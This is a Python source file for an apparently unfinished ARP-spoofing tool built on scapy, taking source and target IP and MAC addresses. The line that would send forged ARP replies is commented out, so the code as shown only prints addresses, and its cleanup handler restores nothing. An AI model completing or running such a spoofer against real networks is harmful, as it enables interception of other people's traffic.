import argparse
import os, sys
import signal
import argparse
import logging
logging.getLogger("scapy").setLevel(logging.CRITICAL)

import scapy.all as scapy
import time
import threading
import socket


class Spoofer(threading.Thread):
    class SpooferRefresh(threading.Thread):
        def __init__(self, event, ip_src, mac_src, ip_dst, mac_dst) -> None:
            super(Spoofer.SpooferRefresh, self).__init__()
            self.event = event
            self.ip_src = ip_src
            self.mac_src = mac_src
            self.ip_dst = ip_dst
            self.mac_dst = mac_dst
            hostname = socket.gethostname()
            self.ip_address = socket.gethostbyname(hostname)

        def run(self):
            ''' Spoofing done every 10 seconds'''
            seconds_to_spoof = 10
            while not self.event.is_set():
                print("ARP spoofing") # Spoof
                self.event.wait(seconds_to_spoof)
                self.ft_spoof()
            print
            exit(0)


        def ft_spoof(self):
            # scapy.send(scapy.ARP(op = 2, pdst = ip_dst, 
            #                  hwdst = mac_src, 
            #                            psrc = self.ip_address), verbose = False)
            print(self.ip_address)
            pass

    def __init__(self, ip_src, mac_src, ip_dst, mac_dst) -> None:
        super(Spoofer, self).__init__()
        self.event = threading.Event()
        self.spoofer_refresher = Spoofer.SpooferRefresh(self.event, ip_src, mac_src, ip_dst, mac_dst)
        signal.signal(signal.SIGINT, self.catch)
        signal.siginterrupt(signal.SIGINT, False)

    def catch(self, signum, frame):
        print("\r", end="")
        print("Free the arp tables")
        self.event.set()
        self.spoofer_refresher.join()

    def run(self):
        self.spoofer_refresher.start()
        while True:
            signal.pause()


def ft_handler(signum, frame):
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ARP spoofer, ./inuisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
    parser.add_argument('addresses', action='store', nargs=4, help="<IP-src> <MAC-src> <IP-target> <MAC-target>")

    args = parser.parse_args()

    ip_src = args.addresses[0]
    mac_src = args.addresses[1]
    ip_dst = args.addresses[2]
    mac_dst = args.addresses[3]
    
    spoofer = Spoofer(ip_src, mac_src, ip_dst, mac_dst)
    spoofer.start()
    spoofer.join()
